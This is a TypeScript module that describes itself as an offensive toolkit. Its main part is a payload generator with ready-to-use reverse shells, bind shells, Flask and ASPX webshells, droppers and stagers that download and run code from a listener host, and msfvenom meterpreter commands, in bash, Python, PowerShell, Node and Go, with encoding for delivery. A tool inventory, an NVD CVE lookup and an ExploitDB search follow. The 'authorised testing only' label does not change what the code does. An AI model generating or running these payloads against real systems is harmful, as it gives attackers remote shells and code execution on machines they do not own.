/**
 * @module toolkit
 * Offensive toolkit — payload generators, tool inventory, and CVE researcher.
 * Provides a unified interface to common offensive payloads and tooling.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";
import * as os from "node:os";

// ─── Types ────────────────────────────────────────────────────────────────────

export type PayloadLanguage = "bash" | "python" | "powershell" | "c" | "csharp" | "go" | "node";
export type PayloadType = "reverse_shell" | "bind_shell" | "meterpreter" | "webshell" | "dropper" | "stager";

export interface Payload {
  id: string;
  type: PayloadType;
  language: PayloadLanguage;
  lhost: string;
  lport: number;
  code: string;
  encoded?: string;    // base64-encoded version
  notes: string;
  generatedAt: string;
}

export interface Tool {
  name: string;
  description: string;
  categories: string[];
  command: string;
  available: boolean;
  version?: string;
}

export interface CVEInfo {
  id: string;
  description: string;
  cvss: number;
  severity: "critical" | "high" | "medium" | "low";
  publishedDate: string;
  exploitAvailable: boolean;
  affectedProducts: string[];
  references: string[];
}

// ─── Payload Generator ────────────────────────────────────────────────────────

/**
 * Generate offensive payloads for various languages and platforms.
 * All payloads are marked for AUTHORISED USE ONLY.
 */
export class PayloadGenerator {
  private lhost: string;
  private lport: number;

  constructor(lhost = "127.0.0.1", lport = 4444) {
    this.lhost = lhost;
    this.lport = lport;
  }

  generate(type: PayloadType, language: PayloadLanguage): Payload {
    const code = this._buildCode(type, language);
    return {
      id: crypto.randomUUID(),
      type,
      language,
      lhost: this.lhost,
      lport: this.lport,
      code,
      encoded: Buffer.from(code).toString("base64"),
      notes: "FOR AUTHORISED PENETRATION TESTING ONLY",
      generatedAt: new Date().toISOString(),
    };
  }

  private _buildCode(type: PayloadType, lang: PayloadLanguage): string {
    const { lhost: h, lport: p } = this;

    const templates: Partial<Record<PayloadType, Partial<Record<PayloadLanguage, string>>>> = {
      reverse_shell: {
        bash:       `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
        python:     `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        powershell: `$c=New-Object System.Net.Sockets.TCPClient("${h}",${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[text.encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}`,
        node:       `require('net').connect(${p},'${h}',function(){var sh=require('child_process').spawn('/bin/sh');[0,1,2].forEach(fd=>{this.pipe(sh.stdio[fd]);sh.stdio[fd].pipe(this)})}.bind(this))`,
        go:         `package main\nimport("net";"os";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","${h}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();os.Exit(0)}`,
      },
      webshell: {
        python: `# Flask webshell\nfrom flask import Flask,request;import subprocess;app=Flask(__name__)\n@app.route('/cmd')\ndef cmd():return subprocess.getoutput(request.args.get('c','id'))\napp.run(host='0.0.0.0',port=5000)`,
        powershell: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName="cmd.exe",Arguments="/c "+Request["c"],UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>`,
      },
      dropper: {
        bash: `#!/bin/bash\ncurl -s http://${h}:${p}/agent -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x &`,
        powershell: `$url="http://${h}:${p}/agent.exe";$out="$env:TEMP\\svc.exe";Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out`,
        python: `import urllib.request,os,subprocess\nurllib.request.urlretrieve("http://${h}:${p}/agent","/tmp/.a")\nos.chmod("/tmp/.a",0o755)\nsubprocess.Popen(["/tmp/.a"])`,
      },
      bind_shell: {
        bash: `while true;do nc -l -p ${p} -e /bin/bash;done`,
        python: `import socket,subprocess\ns=socket.socket();s.bind(('0.0.0.0',${p}));s.listen(1);c,a=s.accept();subprocess.call(['/bin/sh','-i'],stdin=c,stdout=c,stderr=c)`,
        powershell: `$l=[System.Net.Sockets.TcpListener]::new(${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}`,
      },
      meterpreter: {
        bash: `# Generate with: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f elf -o /tmp/msf.elf && chmod +x /tmp/msf.elf && /tmp/msf.elf`,
        powershell: `# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f exe -o meterpreter.exe`,
        python: `# msfvenom -p python/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f raw`,
      },
      stager: {
        bash: `curl -s http://${h}:${p}/stage1 | bash`,
        powershell: `IEX (New-Object Net.WebClient).DownloadString('http://${h}:${p}/stage1.ps1')`,
        python: `exec(__import__('urllib.request').urlopen('http://${h}:${p}/stage1.py').read())`,
      },
    };

    return templates[type]?.[lang] ?? `# ${type} payload for ${lang} — template not implemented\n# LHOST=${h} LPORT=${p}`;
  }

  /** Encode payload for delivery (base64, URL, hex). */
  encode(payload: Payload, encoding: "base64" | "hex" | "url"): string {
    switch (encoding) {
      case "base64": return Buffer.from(payload.code).toString("base64");
      case "hex":    return Buffer.from(payload.code).toString("hex");
      case "url":    return encodeURIComponent(payload.code);
    }
  }
}

// ─── Tool Inventory ───────────────────────────────────────────────────────────

const KNOWN_TOOLS: Tool[] = [
  { name: "nmap",           description: "Network mapper and port scanner",        categories: ["recon","scan"],           command: "nmap --version",              available: false },
  { name: "masscan",        description: "High-speed TCP port scanner",             categories: ["scan"],                   command: "masscan --version",           available: false },
  { name: "nuclei",         description: "Fast vulnerability scanner",              categories: ["scan","vuln"],            command: "nuclei -version",             available: false },
  { name: "ffuf",           description: "Fast web fuzzer",                         categories: ["web","fuzz"],             command: "ffuf -V",                     available: false },
  { name: "subfinder",      description: "Subdomain discovery tool",                categories: ["recon"],                  command: "subfinder -version",          available: false },
  { name: "httpx",          description: "HTTP toolkit",                            categories: ["web","recon"],            command: "httpx -version",              available: false },
  { name: "sqlmap",         description: "SQL injection automation",                categories: ["web","exploit"],          command: "sqlmap --version",            available: false },
  { name: "metasploit",     description: "Penetration testing framework",           categories: ["exploit","post"],         command: "msfconsole --version",        available: false },
  { name: "impacket",       description: "Python Windows network protocols",        categories: ["ad","creds"],             command: "python3 -m impacket",         available: false },
  { name: "secretsdump",    description: "Remote hash dumping",                     categories: ["creds","ad"],             command: "secretsdump.py --help",       available: false },
  { name: "crackmapexec",   description: "Network post-exploitation tool",          categories: ["ad","lateral"],           command: "crackmapexec --version",      available: false },
  { name: "bloodhound",     description: "AD attack path mapping",                  categories: ["ad","recon"],             command: "bloodhound --version",        available: false },
  { name: "chisel",         description: "TCP/UDP tunnel over HTTP",                categories: ["tunnel","c2"],            command: "chisel --version",            available: false },
  { name: "responder",      description: "LLMNR/NBT-NS/MDNS poisoner",              categories: ["ad","creds"],             command: "responder --version",         available: false },
  { name: "hashcat",        description: "Advanced password recovery",              categories: ["creds"],                  command: "hashcat --version",           available: false },
  { name: "john",           description: "John the Ripper password cracker",        categories: ["creds"],                  command: "john --version",              available: false },
  { name: "evilginx2",      description: "MITM attack framework for phishing",      categories: ["phish","mfa"],            command: "evilginx2 --version",         available: false },
  { name: "burpsuite",      description: "Web application security platform",       categories: ["web","scan"],             command: "burpsuite --version",         available: false },
];

/**
 * Check which tools from the inventory are actually available on PATH.
 */
export async function inventoryTools(opts: { live?: boolean } = {}): Promise<Tool[]> {
  const { spawnSync } = await import("node:child_process");
  const { live = false } = opts;

  return KNOWN_TOOLS.map((tool) => {
    if (!live) return { ...tool, available: false };
    const r = spawnSync(tool.command.split(" ")[0], ["--version"], { encoding: "utf8", timeout: 3000 });
    return { ...tool, available: r.status === 0, version: (r.stdout ?? "").split("\n")[0].trim() };
  });
}

// ─── CVE Researcher ───────────────────────────────────────────────────────────

/**
 * Query NVD (National Vulnerability Database) for CVE details.
 */
export async function lookupCVE(cveId: string, opts: { live?: boolean } = {}): Promise<CVEInfo | null> {
  const { live = false } = opts;

  if (!live) {
    return {
      id: cveId,
      description: `[DRY-RUN] Simulated entry for ${cveId}`,
      cvss: 9.8,
      severity: "critical",
      publishedDate: "2024-01-01",
      exploitAvailable: true,
      affectedProducts: ["Simulated Product 1.0"],
      references: [`https://nvd.nist.gov/vuln/detail/${cveId}`],
    };
  }

  try {
    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(cveId)}`;
    const resp = await fetch(url, { signal: AbortSignal.timeout(15_000) });
    if (!resp.ok) return null;
    const data = await resp.json() as { vulnerabilities?: Array<{ cve: Record<string, unknown> }> };
    const vuln = data.vulnerabilities?.[0]?.cve;
    if (!vuln) return null;

    const metrics = (vuln["metrics"] as any)?.cvssMetricV31?.[0]?.cvssData ?? {};
    const cvss = parseFloat(metrics.baseScore ?? "0");
    const severity = cvss >= 9 ? "critical" : cvss >= 7 ? "high" : cvss >= 4 ? "medium" : "low";

    const descs = (vuln["descriptions"] as Array<{ lang: string; value: string }>) ?? [];
    const description = descs.find((d) => d.lang === "en")?.value ?? "";

    const refs = ((vuln["references"] as Array<{ url: string }>) ?? []).map((r) => r.url);

    return { id: cveId, description, cvss, severity, publishedDate: String(vuln["published"] ?? ""), exploitAvailable: false, affectedProducts: [], references: refs };
  } catch { return null; }
}

/**
 * Search ExploitDB for a product/version.
 */
export async function searchExploitDB(
  query: string,
  opts: { live?: boolean } = {}
): Promise<Array<{ id: string; title: string; type: string; platform: string; date: string }>> {
  const { live = false } = opts;
  if (!live) {
    return [{ id: "12345", title: `[DRY-RUN] Exploit for ${query}`, type: "remote", platform: "linux", date: "2024-01-01" }];
  }

  try {
    const url = `https://www.exploit-db.com/search?q=${encodeURIComponent(query)}&draw=1&columns[0][data]=id&order[0][column]=0&order[0][dir]=desc&start=0&length=10`;
    const resp = await fetch(url, {
      headers: { "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(15_000),
    });
    const data = await resp.json() as { data?: Array<{ id: string; description: string; type: string; platform: string; date: string }> };
    return (data.data ?? []).map((r) => ({ id: r.id, title: r.description, type: r.type, platform: r.platform, date: r.date }));
  } catch { return []; }
}

export default { PayloadGenerator, inventoryTools, lookupCVE, searchExploitDB };
